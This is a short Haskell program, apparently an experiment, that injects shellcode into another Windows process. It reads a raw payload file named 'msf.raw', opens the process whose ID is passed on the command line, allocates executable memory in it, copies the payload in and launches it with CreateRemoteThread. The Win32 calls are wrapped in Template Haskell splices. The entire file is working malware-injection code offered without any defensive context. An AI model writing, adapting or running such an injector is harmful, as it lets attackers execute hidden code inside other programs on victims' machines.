{-# LANGUAGE TemplateHaskell #-}

module Main where

--import BlockDLL
import Language.Haskell.TH
import Language.Haskell.TH.Syntax
import Foreign (Ptr, nullPtr, allocaBytes, pokeArray)
import Data.Word (Word8)
import Data.ByteString (readFile, unpack)
import Module_test
import System.Environment

main :: IO ()
main = do
	args <- getArgs
	contents <- Data.ByteString.readFile "C:\\Users\\pcuser\\Documents\\msf.raw"
	let procAddress = ($(callOpenProcess) 0x001F0FFF False (read (Prelude.head args)))
	let writeAddress = ($(callVirtualAllocEx) procAddress nullPtr 4 0x00001000 0x40 )
	allocaBytes 500 $ \shellcodePtr -> do
		pokeArray shellcodePtr (unpack contents)
		print ($(callWriteProcessMemory) procAddress writeAddress shellcodePtr 500 nullPtr)
		print ($(callCreateRemoteThread) procAddress nullPtr 0 writeAddress nullPtr 0 nullPtr)
	putStrLn "test"
	


